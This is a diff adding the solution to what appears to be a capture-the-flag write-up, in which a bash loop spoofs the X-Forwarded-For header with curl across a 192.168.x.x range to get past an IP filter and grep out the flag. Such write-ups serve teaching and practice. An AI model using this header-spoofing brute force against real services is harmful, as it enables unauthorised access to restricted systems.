@@ -12,7 +12,16 @@ The webpage with spare parts listing is available at <a href="http://key-parts-l
 
 #### Solution:
 
+- standard bypass of IP filter with `X-Forwarded-For` header seems to work on quick try, so all that is needed is brute-force the correct IP from mentioned range
+
 ```bash
+for o in `seq 96 111`; 
+    do for i in `seq 0 255`; 
+        do curl http://key-parts-list.cns-jv.tcc/ -H "X-Forwarded-For: 192.168.${o}.${i}" 2>/dev/null | \
+            grep -v 'Access denied.' | \
+            grep 'FLAG{'; 
+    done
+done
 ```
 
 ---
